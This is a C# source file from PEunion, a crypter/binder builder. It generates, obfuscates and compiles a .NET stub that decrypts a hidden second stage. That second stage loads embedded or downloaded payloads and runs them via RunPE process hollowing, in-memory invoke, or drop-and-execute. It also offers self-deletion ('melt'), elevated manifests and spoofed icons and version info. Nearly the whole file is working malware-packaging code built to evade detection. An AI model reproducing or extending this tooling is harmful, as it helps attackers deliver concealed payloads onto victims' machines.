using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using BytecodeApi.IO.FileSystem;
using BytecodeApi.Mathematics;
using BytecodeApi.Text;
using PEunion.Compiler.Errors;
using PEunion.Compiler.Helper;
using PEunion.Compiler.Project;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Resources;

namespace PEunion.Compiler.Compiler
{
	/// <summary>
	/// Implements compilation of 32-bit and 64-bit .NET executables using CodeDom as underlying compiler.
	/// </summary>
	public sealed class DotNetCompiler : ProjectCompiler
	{
		private readonly CompilerHelper Helper;
		private readonly CSharpObfuscator Obfuscator;
		private readonly List<string> Stage2SourceCodeFiles;
		private readonly List<string> StubSourceCodeFiles;
		private readonly string Stage2ResourcesFileName;
		private readonly string StubResourcesFileName;
		private bool Is64Bit => Project.Stub.Type == StubType.DotNet64;

		internal DotNetCompiler(ProjectFile project, string intermediateDirectory, string outputFileName, ErrorCollection errors) : base(project, intermediateDirectory, outputFileName, errors)
		{
			Helper = new CompilerHelper(Project, Errors);
			Obfuscator = new CSharpObfuscator();

			Stage2SourceCodeFiles = new List<string>
			{
				"Stage2.cs",
				"Api.cs"
			};
			StubSourceCodeFiles = new List<string>
			{
				"Stub.cs",
				"Emulator.cs",
				"Api.cs"
			};

			Stage2ResourcesFileName = BytecodeApi.Create.AlphaNumericString(MathEx.Random.Next(20, 30)) + ".resources";
			StubResourcesFileName = BytecodeApi.Create.AlphaNumericString(MathEx.Random.Next(20, 30)) + ".resources";
		}

		/// <summary>
		/// Compiles the project with the current settings.
		/// </summary>
		public override void Compile()
		{
			try
			{
				// Validate required files & directories
				Helper.ValidateFiles
				(
					ApplicationBase.Path,
					@"Stub\dotnet\"
				);
				if (Errors.HasErrors) return;

				// Copy source files to intermediate directory
				DirectoryEx.CopyTo(Path.Combine(ApplicationBase.Path, @"Stub\dotnet"), IntermediateDirectorySource);

				// Validate required source files
				Helper.ValidateFiles
				(
					IntermediateDirectorySource,
					"Stub.cs",
					"Stage2.cs",
					"Api.cs",
					"Compression.cs",
					"Download.cs",
					"Drop.cs",
					"Emulator.cs",
					"GetResource.cs",
					"Invoke.cs",
					"RunPE.cs",
					@"Resources\default.manifest",
					@"Resources\elevated.manifest"
				);
				if (Errors.HasErrors) return;

				// Obfuscate shared code used by Stub and Stage2
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Api.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Compression.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Download.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Drop.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Emulator.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("GetResource.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Invoke.cs"));
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("RunPE.cs"));

				// Validate that RunPE and .NET invoked executables match the bitness of the stub
				Helper.ValidateRunPEBitness(Is64Bit ? 64 : 32);
				Helper.ValidateInvokeBitness(Is64Bit ? 64 : 32);
				if (Errors.HasErrors) return;

				// Compile stage2
				CompileStage2();
				if (Errors.HasErrors) return;

				// Assemble stage2
				AssembleStage2();
				if (Errors.HasErrors) return;

				// Compile stub
				CompileStub();
				if (Errors.HasErrors) return;

				// Assemble stub
				AssembleStub();
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while compiling project.", ex.GetFullStackTrace());
			}
		}

		private void CompileStage2()
		{
			try
			{
				// Only compile methods that are needed
				if (Project.Sources.OfType<EmbeddedSource>().Any()) Stage2SourceCodeFiles.Add("GetResource.cs");
				if (Project.Sources.OfType<EmbeddedSource>().Any(source => source.Compress)) Stage2SourceCodeFiles.Add("Compression.cs");
				if (Project.Sources.OfType<DownloadSource>().Any()) Stage2SourceCodeFiles.Add("Download.cs");
				if (Project.Actions.OfType<RunPEAction>().Any()) Stage2SourceCodeFiles.Add("RunPE.cs");
				if (Project.Actions.OfType<InvokeAction>().Any()) Stage2SourceCodeFiles.Add("Invoke.cs");
				if (Project.Actions.OfType<DropAction>().Any()) Stage2SourceCodeFiles.Add("Drop.cs");

				// Compile resources
				using (ResourceWriter resourceWriter = new ResourceWriter(GetIntermediateSourcePath(@"Resources\" + Stage2ResourcesFileName)))
				{
					foreach (EmbeddedSource source in Project.Sources.OfType<EmbeddedSource>())
					{
						byte[] file = File.ReadAllBytes(source.Path);
						resourceWriter.AddResource(source.AssemblyId.ToString(), source.Compress ? Compression.Compress(file) : file);
					}
				}

				// Compile main program
				string[] stage2Lines = File.ReadAllLines(GetIntermediateSourcePath("Stage2.cs"));
				using (CSharpStream assembly = new CSharpStream(GetIntermediateSourcePath("Stage2.cs")))
				{
					if (Project.Startup.Melt)
					{
						assembly.Emit("#define MELT");
						assembly.WriteLine();
					}

					foreach (string line in stage2Lines)
					{
						if (line.Trim() == "//{MAIN}")
						{
							assembly.Indent = 8;

							// Compile actions
							foreach (ProjectAction action in Project.Actions)
							{
								assembly.EmitLabel("action_" + action.AssemblyId);
								assembly.Emit("try");
								assembly.BlockBegin();

								// Retrieve source
								if (action.Source is EmbeddedSource embeddedSource)
								{
									assembly.EmitComment("Get embedded file: " + Path.GetFileName(embeddedSource.Path));
									assembly.Emit("byte[] payload = __GetResource(/**/\"" + embeddedSource.AssemblyId + "\");");
									assembly.WriteLine();

									if (embeddedSource.Compress)
									{
										assembly.EmitComment("Decompress embedded file");
										assembly.Emit("payload = __Decompress(payload);");
										assembly.WriteLine();
									}
								}
								else if (action.Source is DownloadSource downloadSource)
								{
									assembly.EmitComment("Download: " + downloadSource.Url);
									assembly.Emit("byte[] payload = __Download(/**/\"" + downloadSource.Url + "\");");
									assembly.WriteLine();
								}
								else if (action is MessageBoxAction)
								{
								}
								else
								{
									throw new InvalidOperationException();
								}

								// Perform action
								if (action is RunPEAction)
								{
									assembly.EmitComment("RunPE");
									assembly.Emit("__RunPE(Application.ExecutablePath, __CommandLine, payload);");
								}
								else if (action is InvokeAction)
								{
									assembly.EmitComment("Invoke .NET executable");
									assembly.Emit("__Invoke(payload);");
								}
								else if (action is DropAction dropAction)
								{
									assembly.EmitComment("Drop " + dropAction.Location.GetDescription() + @"\" + dropAction.FileName + (dropAction.ExecuteVerb == ExecuteVerb.None ? null : " and execute (verb: " + dropAction.ExecuteVerb.GetDescription() + ")"));
									assembly.Emit("__DropFile(/**/" + (int)dropAction.Location + ", payload, /**/" + new QuotedString(dropAction.FileName) + ", /**/" + dropAction.GetWin32FileAttributes() + ", /**/" + (int)dropAction.ExecuteVerb + ");");
								}
								else if (action is MessageBoxAction messageBoxAction)
								{
									assembly.EmitComment("MessageBox (icon: " + messageBoxAction.Icon.GetDescription() + ", buttons: " + messageBoxAction.Buttons.GetDescription() + ")");
									assembly.Emit("DialogResult result = MessageBox.Show(/**/" + new QuotedString(messageBoxAction.Text) + ", /**/" + new QuotedString(messageBoxAction.Title) + ", (MessageBoxButtons)/**/" + (int)messageBoxAction.Buttons + ", (MessageBoxIcon)/**/" + (int)messageBoxAction.Icon + ");");
									if (messageBoxAction.HasEvents) assembly.WriteLine();

									EmitMessageBoxEvent(messageBoxAction.OnOk, "ok", 1);
									EmitMessageBoxEvent(messageBoxAction.OnCancel, "cancel", 2);
									EmitMessageBoxEvent(messageBoxAction.OnYes, "yes", 6);
									EmitMessageBoxEvent(messageBoxAction.OnNo, "no", 7);
									EmitMessageBoxEvent(messageBoxAction.OnAbort, "abort", 3);
									EmitMessageBoxEvent(messageBoxAction.OnRetry, "retry", 4);
									EmitMessageBoxEvent(messageBoxAction.OnIgnore, "ignore", 5);

									void EmitMessageBoxEvent(ActionEvent actionEvent, string eventName, int result)
									{
										if (actionEvent != ActionEvent.None)
										{
											assembly.EmitComment("If '" + eventName + "' was clicked, " + Helper.GetCommentForActionEvent(actionEvent));
											string code = "if (result == (DialogResult)/**/" + result + ") ";

											switch (actionEvent)
											{
												case ActionEvent.SkipNextAction:
													code += "goto " + (action == Project.Actions.Last() ? "end" : "action_" + (action.AssemblyId + 1) + "_end") + ";";
													break;
												case ActionEvent.Exit:
													code += "goto end;";
													break;
												default:
													throw new InvalidOperationException();
											}

											assembly.Emit(code);
										}
									}
								}
								else
								{
									throw new InvalidOperationException();
								}

								assembly.BlockEnd();
								assembly.Emit("catch");
								assembly.BlockBegin();
								assembly.BlockEnd();

								assembly.EmitLabel("action_" + action.AssemblyId + "_end");
								assembly.WriteLine();
							}
						}
						else
						{
							assembly.Indent = 0;
							assembly.WriteLine(line);
						}
					}
				}

				// Obfuscate code
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Stage2.cs"));
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while compiling stage2.", ex.GetFullStackTrace());
			}
		}
		private void AssembleStage2()
		{
			try
			{
				string intermediateOutputFileName = GetIntermediateBinaryPath("stage2.exe");
				bool success = Helper.DotNetCompile
				(
					Stage2SourceCodeFiles.Select(file => GetIntermediateSourcePath(file)).ToArray(),
					new[]
					{
						"mscorlib.dll",
						"System.dll",
						"System.Core.dll",
						"System.Windows.Forms.dll"
					},
					new[]
					{
						GetIntermediateSourcePath(@"Resources\" + Stage2ResourcesFileName)
					},
					null,
					null,
					intermediateOutputFileName,
					Is64Bit,
					out string[] errors
				);

				if (!success)
				{
					Errors.AddRange(errors.Select(error => new Error(ErrorSource.Assembly, ErrorSeverity.Error, error)));
				}
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while assembling stage2.", ex.GetFullStackTrace());
			}
		}
		private void CompileStub()
		{
			try
			{
				string resourceName = BytecodeApi.Create.AlphaNumericString(MathEx.Random.Next(20, 30));
				uint stage2Key;
				uint stage2PaddingMask;
				int stage2PaddingByteCount;

				// Encrypt stage2 into [random name].resources
				using (ResourceWriter resourceWriter = new ResourceWriter(GetIntermediateSourcePath(@"Resources\" + StubResourcesFileName)))
				{
					string encryptedPath = GetIntermediateBinaryPath("stage2.exe_encrypted");
					Helper.EncryptData
					(
						GetIntermediateBinaryPath("stage2.exe"),
						encryptedPath,
						Project.Stub.Padding,
						out stage2Key,
						out stage2PaddingMask,
						out stage2PaddingByteCount
					);

					resourceWriter.AddResource(resourceName, File.ReadAllBytes(encryptedPath));
				}

				// Compile stub
				string[] stubLines = File.ReadAllLines(GetIntermediateSourcePath("Stub.cs"));
				using (CSharpStream assembly = new CSharpStream(GetIntermediateSourcePath("Stub.cs")))
				{
					foreach (string line in stubLines)
					{
						if (line.Trim() == "//{STAGE2HEADER}")
						{
							assembly.Indent = 12;

							assembly.Emit("string resourceFileName = /**/\"" + StubResourcesFileName + "\";");
							assembly.Emit("string resourceName = /**/\"" + resourceName + "\";");
							assembly.Emit("const long stage2Size = " + new FileInfo(GetIntermediateBinaryPath("stage2.exe")).Length + ";");
							assembly.Emit("uint key = 0x" + stage2Key.ToString("x8") + ";");
							assembly.Emit("uint paddingMask = 0x" + stage2PaddingMask.ToString("x8") + ";");
							assembly.Emit("int paddingByteCount = /**/" + stage2PaddingByteCount + ";");
						}
						else
						{
							assembly.WriteLine(line);
						}
					}
				}

				// Add VersionInfo
				if (!Project.VersionInfo.IsEmpty)
				{
					using (CSharpStream versionInfo = new CSharpStream(GetIntermediateSourcePath("VersionInfo.cs")))
					{
						versionInfo.Emit("using System.Reflection;");
						versionInfo.WriteLine();

						if (!Project.VersionInfo.FileDescription.IsNullOrEmpty()) versionInfo.Emit("[assembly: AssemblyTitle(" + new QuotedString(Project.VersionInfo.FileDescription) + ")]");
						if (!Project.VersionInfo.ProductName.IsNullOrEmpty()) versionInfo.Emit("[assembly: AssemblyProduct(" + new QuotedString(Project.VersionInfo.ProductName) + ")]");
						if (!Project.VersionInfo.FileVersion.IsNullOrEmpty()) versionInfo.Emit("[assembly: AssemblyFileVersion(" + new QuotedString(Project.VersionInfo.FileVersion) + ")]");
						if (!Project.VersionInfo.ProductVersion.IsNullOrEmpty()) versionInfo.Emit("[assembly: AssemblyInformationalVersion(" + new QuotedString(Project.VersionInfo.ProductVersion) + ")]");
						if (!Project.VersionInfo.Copyright.IsNullOrEmpty()) versionInfo.Emit("[assembly: AssemblyCopyright(" + new QuotedString(Project.VersionInfo.Copyright) + ")]");
					}

					StubSourceCodeFiles.Add("VersionInfo.cs");
				}

				// Obfuscate code
				Obfuscator.ObfuscateFile(GetIntermediateSourcePath("Stub.cs"));
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Compiler, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while compiling stub.", ex.GetFullStackTrace());
			}
		}
		private void AssembleStub()
		{
			try
			{
				string intermediateOutputFileName = GetIntermediateBinaryPath(Project.VersionInfo.OriginalFilename.ToNullIfEmpty() ?? Path.GetFileName(OutputFileName));

				string manifestFileName;
				if (Project.Manifest.Template != null)
				{
					manifestFileName = GetIntermediateSourcePath(@"Resources\" + Project.Manifest.Template.GetDescription() + ".manifest");
				}
				else if (Project.Manifest.Path != null)
				{
					manifestFileName = GetIntermediateSourcePath(@"Resources\" + Path.GetFileNameWithoutExtension(Project.Manifest.Path) + ".manifest");
					File.Copy(Project.Manifest.Path, manifestFileName);
				}
				else
				{
					manifestFileName = null;
				}

				string iconFileName;
				if (Project.Stub.IconPath != null)
				{
					iconFileName = GetIntermediateSourcePath(@"Resources\icon.ico");

					Icon icon = IconExtractor.FromFile(Project.Stub.IconPath);
					if (icon == null) throw new ErrorException("Could not read icon from file '" + Path.GetFileName(Project.Stub.IconPath) + "'.");

					icon.Save(iconFileName);
				}
				else
				{
					iconFileName = null;
				}

				bool success = Helper.DotNetCompile
				(
					StubSourceCodeFiles.Select(file => GetIntermediateSourcePath(file)).ToArray(),
					new[]
					{
						"mscorlib.dll",
						"System.dll",
						"System.Core.dll",
						"System.Windows.Forms.dll"
					},
					new[]
					{
						GetIntermediateSourcePath(@"Resources\" + StubResourcesFileName)
					},
					manifestFileName,
					iconFileName,
					intermediateOutputFileName,
					Is64Bit,
					out string[] errors
				);

				if (success)
				{
					Helper.AppendEofData(intermediateOutputFileName);
					File.Copy(intermediateOutputFileName, OutputFileName, true);
				}
				else
				{
					Errors.AddRange(errors.Select(error => new Error(ErrorSource.Assembly, ErrorSeverity.Error, error)));
				}
			}
			catch (ErrorException ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, ex.Message, ex.Details);
			}
			catch (Exception ex)
			{
				Errors.Add(ErrorSource.Assembly, ErrorSeverity.Error, "Unhandled " + ex.GetType() + " while assembling stub.", ex.GetFullStackTrace());
			}
		}
	}
}